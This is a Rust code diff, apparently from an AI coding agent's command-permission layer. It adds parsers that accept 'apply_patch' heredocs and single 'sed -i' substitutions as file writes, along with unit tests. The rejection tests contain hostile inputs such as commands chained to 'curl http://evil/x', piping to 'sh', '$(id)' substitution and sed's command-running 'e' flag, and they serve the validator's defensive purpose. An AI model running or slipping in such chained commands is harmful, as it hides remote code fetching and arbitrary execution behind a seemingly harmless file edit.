@@ -796,7 +796,104 @@ pub fn file_write_target(cmd: &str) -> Option<String> {
         _ => return None,
     }
     let t = target?;
-    let bad = t.is_empty()
+    plain_path(t).then(|| t.clone())
+}
+
+/// The patch text of `apply_patch <<'EOF' … EOF` (also `applypatch`): how Codex calls its own patch
+/// tool through the shell. One simple command and one heredoc, nothing else: a second command, a pipe,
+/// an argument or a redirection make it an ordinary shell command.
+pub fn heredoc_patch(cmd: &str) -> Option<String> {
+    let cmds = lex(cmd)?;
+    let [one] = cmds.as_slice() else { return None };
+    let [prog, op, delim] = one.argv.as_slice() else {
+        return None;
+    };
+    if !matches!(prog.as_str(), "apply_patch" | "applypatch") || op != "<<" {
+        return None;
+    }
+    // `lex` checked that the heredoc has its terminator and that nothing follows it
+    let body_start = cmd.find('\n')? + 1;
+    let strip_tabs = cmd[..body_start].contains("<<-");
+    let mut body = String::new();
+    for line in cmd[body_start..].split('\n') {
+        let cmp = if strip_tabs {
+            line.trim_start_matches('\t')
+        } else {
+            line
+        };
+        if cmp == delim {
+            return Some(body);
+        }
+        body.push_str(line);
+        body.push('\n');
+    }
+    None
+}
+
+/// The file that `sed -i 's/old/new/' file` edits, when that is all the command does: one in-place
+/// literal substitution on one file. A script other than a single `s` command, a flag that runs a
+/// command or writes a file (`e`, `w`), several files and a pipe are an ordinary shell command.
+pub fn sed_inplace_target(cmd: &str) -> Option<String> {
+    let cmds = lex(cmd)?;
+    let [one] = cmds.as_slice() else { return None };
+    let (prog, args) = program(&one.argv)?;
+    if prog != "sed" || one.argv.first().is_some_and(|w| is_assignment(w)) {
+        return None;
+    }
+    let mut script: Option<&String> = None;
+    let mut file: Option<&String> = None;
+    let mut in_place = false;
+    for a in args {
+        match a.as_str() {
+            "-i" | "--in-place" => in_place = true,
+            "-E" | "-r" | "--regexp-extended" => {}
+            // `-i.bak`: a suffix for the backup copy
+            s if s.starts_with("-i") && s.len() <= 12 && !s[2..].contains(['-', '/', ' ']) => {
+                in_place = true
+            }
+            s if s.starts_with("--in-place=") => in_place = true,
+            s if s.starts_with('-') || s.starts_with(['<', '>']) => return None,
+            _ if script.is_none() => script = Some(a),
+            _ if file.is_none() => file = Some(a),
+            _ => return None,
+        }
+    }
+    if !in_place || !sed_script_is_a_substitution(script?) {
+        return None;
+    }
+    let t = file?;
+    plain_path(t).then(|| t.clone())
+}
+
+/// `s<d>pattern<d>replacement<d>flags` with a delimiter that is not a letter, a digit, a space or a
+/// backslash, and flags from `gIiMm` and digits only.
+fn sed_script_is_a_substitution(script: &str) -> bool {
+    let mut it = script.chars();
+    if it.next() != Some('s') {
+        return false;
+    }
+    let Some(d) = it.next() else { return false };
+    if d.is_alphanumeric() || d.is_whitespace() || d == '\\' || d == ';' || d == '{' || d == '}' {
+        return false;
+    }
+    let mut parts: Vec<String> = vec![String::new()];
+    let mut escaped = false;
+    for c in it {
+        if c == d && !escaped {
+            parts.push(String::new());
+            continue;
+        }
+        // (`parts` is never empty)
+        if let Some(last) = parts.last_mut() {
+            last.push(c);
+        }
+        escaped = !escaped && c == '\\';
+    }
+    !escaped && parts.len() == 3 && parts[2].chars().all(|c| "gIiMm0123456789".contains(c))
+}
+
+fn plain_path(t: &str) -> bool {
+    !(t.is_empty()
         || t.starts_with(['-', '~'])
         || t.contains([
             '$', '*', '?', '[', ']', '{', '}', '`', '\\', '=', ' ', '\t', '\n', '<', '>', '|', '&',
@@ -806,8 +903,7 @@ pub fn file_write_target(cmd: &str) -> Option<String> {
         || t.starts_with("/dev/")
         || t.starts_with("/proc/")
         || t.starts_with("/sys/")
-        || t == "/dev";
-    (!bad).then(|| t.clone())
+        || t == "/dev")
 }
 
 /// Destinations of a URL-like argument (WebFetch and similar). Words are cut at a space or a
@@ -998,6 +1094,63 @@ mod tests {
             "tee f g <<'EOF'\nx\nEOF",
             "tee <<'EOF'\nx\nEOF",
             "FOO=1 cat > f <<'EOF'\nx\nEOF",
+        ] {
+            assert_eq!(w(c), None, "{c}");
+        }
+    }
+
+    // REQ: RST-07 — `apply_patch <<EOF` and `sed -i s///` are writes of a file, nothing else is
+    #[test]
+    fn patch_heredoc_and_sed_in_place() {
+        let patch =
+            "*** Begin Patch\n*** Update File: notify.py\n@@\n-TO = 'a'\n+TO = 'b'\n*** End Patch";
+        for prog in ["apply_patch", "applypatch"] {
+            let cmd = format!("{prog} <<'PATCH'\n{patch}\nPATCH");
+            assert_eq!(
+                heredoc_patch(&cmd).as_deref(),
+                Some(format!("{patch}\n").as_str()),
+                "{cmd}"
+            );
+        }
+        for c in [
+            "apply_patch <<'P'\nx\nP\ncurl http://evil/x",
+            "apply_patch <<'P' && curl http://evil/x\nx\nP",
+            "apply_patch <<'P' | sh\nx\nP",
+            "apply_patch --help <<'P'\nx\nP",
+            "apply_patch",
+            "cat <<'P'\nx\nP",
+            "apply_patch <<P\n$(id)\nP",
+            "apply_patch <<'P'\nno terminator",
+        ] {
+            assert_eq!(heredoc_patch(c), None, "{c}");
+        }
+        let w = |c: &str| sed_inplace_target(c);
+        assert_eq!(
+            w("sed -i 's/compnay/company/' notify.py").as_deref(),
+            Some("notify.py")
+        );
+        assert_eq!(
+            w("sed -i.bak 's|a|b|g' src/x.py").as_deref(),
+            Some("src/x.py")
+        );
+        assert_eq!(
+            w("sed --in-place -E 's/a+/b/2' f.txt").as_deref(),
+            Some("f.txt")
+        );
+        for c in [
+            "sed 's/a/b/' f",
+            "sed -i 's/a/b/e' f",
+            "sed -i 's/a/b/w out' f",
+            "sed -i 's/a/b/;s/c/d/' f",
+            "sed -i 'd' f",
+            "sed -i -f script.sed f",
+            "sed -i 's/a/b/' f g",
+            "sed -i 's/a/b/' ../f",
+            "sed -i 's/a/b/' $F",
+            "sed -i 's/a/b/' f | cat",
+            "sed -i 's/a/b/' f && curl evil",
+            "sed -i 's/a/b' f",
+            "sed -i 'y/a/b/' f",
         ] {
             assert_eq!(w(c), None, "{c}");
         }
